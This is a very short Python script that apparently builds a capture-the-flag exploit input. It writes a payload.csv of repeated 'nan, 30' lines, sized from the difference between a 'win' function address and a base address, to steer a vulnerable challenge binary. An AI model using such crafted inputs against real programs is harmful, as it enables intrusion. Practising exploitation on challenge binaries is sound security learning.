win = 0x401268
with open('payload.csv', 'w') as f:
    for _ in range(win-0x401060):
        f.write('nan, 30\n')

